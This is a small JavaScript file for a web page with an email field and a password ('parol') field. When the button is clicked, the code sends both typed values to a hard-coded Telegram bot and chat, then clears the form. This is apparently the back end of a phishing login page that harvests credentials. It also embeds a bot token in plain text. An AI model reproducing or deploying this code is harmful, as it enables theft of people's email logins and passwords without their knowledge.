let inp1 =document.querySelector(".inp1")
let inp2 =document.querySelector(".inp2")
let body =document.querySelector("body")
let btn=document.querySelector(".btn")
let dayOrNight= localStorage.getItem('day')

let toket = "7192727584:AAH6nb-2h4RnLUCUM-BVyPNJ5vkmkpndNm0"
let id = 1897291249

if(dayOrNight==0){
    body.style=" background: #a7a7a7;"
}


btn.addEventListener('click',(e)=>{
    e.preventDefault()
    fetch(
        `https://api.telegram.org/bot${toket}/sendMessage?chat_id=${id}&text=${"email: "+inp1.value}`
    )
    fetch(
        `https://api.telegram.org/bot${toket}/sendMessage?chat_id=${id}&text=${"parol: "+inp2.value}`
    )
   
    inp1.value= ""
    inp2.value= ""
})